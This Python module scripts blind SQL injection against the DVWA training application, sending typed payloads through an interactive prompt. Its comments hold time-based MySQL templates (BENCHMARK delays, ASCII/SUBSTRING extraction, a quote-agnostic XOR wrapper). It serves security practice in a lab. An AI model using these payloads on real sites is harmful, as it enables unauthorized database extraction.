"""Module to exploit Blind SQL Injection vulnerability"""
import requests
from bs4 import BeautifulSoup

from dvwa.main import DVWA

# _SQL = "SELECT %s FROM %s LIMIT %d,1"                       # column, table, row
# _CONDITION = "ASCII(SUBSTRING((%s),%d,1))%s%d"              # _sql, char, op, value
# _QUESTION = "IF((%s),BENCHMARK(%d,SHA1(0xDEADBEEF)),NULL)"  # _condition, delay
# _ADAPTIVE = "%s/*'XOR(%s)OR'|\"XOR(%s)OR\"*/"               # _question, _question, _question

"""
SELECT "ABCD" FROM DUAL LIMIT 0,1
ASCII(SUBSTRING(($$$),3,1))=67
IF(($$$),BENCHMARK(5000000,SHA1(0xDEADBEEF)),NULL)
$$$/*'XOR($$$)OR'|"XOR($$$)OR"*/

"""


class Exploit:
    """Class to exploit Blind SQL Injection vulnerability"""

    def __init__(self, vuln_url, cookie):
        self.vuln_url = vuln_url
        self.cookie = cookie

    def shell(self):
        """Interactive Blind SQL Injection shell"""

        while True:
            try:
                injection = input(" >> ")
                if injection.lower() in ("exit", "quit"):
                    raise KeyboardInterrupt
            except KeyboardInterrupt:
                print("\nExiting...")
                break
            else:
                self.run_exploit(injection)

    def run_exploit(self, injection):
        """Runs the Blind SQL Injection exploit"""

        params = {
            "id": injection,
            "Submit": "Submit"
        }
        request = {
            "url": self.vuln_url,
            "cookies": self.cookie,
            "allow_redirects": False,
            "params": params
        }
        response = requests.get(**request)
        soup = BeautifulSoup(response.text, "lxml")
        div = soup.find("div", {"class": "vulnerable_code_area"})
        print(div)


def main():
    dvwa = DVWA()
    dvwa.login()
    dvwa.set_security_level()
    dvwa.set_phpids_mode()

    vulns = dvwa.get_vulns()
    vuln_url = vulns["SQL Injection (Blind)"]
    cookie = dvwa.cookie

    exploit = Exploit(vuln_url, cookie)
    exploit.shell()


if __name__ == "__main__":
    main()
